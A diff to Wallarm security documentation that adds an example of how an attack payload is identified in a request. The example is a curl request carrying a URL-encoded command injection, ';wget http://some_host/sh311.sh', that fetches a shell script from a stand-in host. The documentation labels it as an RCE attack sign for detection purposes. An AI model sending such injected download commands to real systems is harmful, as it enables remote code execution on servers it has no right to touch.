@@ -21,6 +21,14 @@ This hit grouping is applied to all hits. In Wallarm Console, you can additional
 
     Since attack signs are not used to detect [behavioral attacks](../attacks-vulns-list.md#attack-types), requests sent as a part of behavioral attacks have empty payloads.
 
+For example, in this request:
+
+```bash
+curl localhost/?23036d6ba7=%3Bwget+http%3A%2F%2Fsome_host%2Fsh311.sh
+```
+
+the malicious payload is `;wget http://some_host/sh311.sh`, where `;wget+` is the [RCE](../attacks-vulns-list.md#remote-code-execution-rce) attack sign and the rest is its context.
+
 [Learn how to analyze attacks in Wallarm →](../user-guides/events/check-attack.md)
 
 ## Types of protected resources
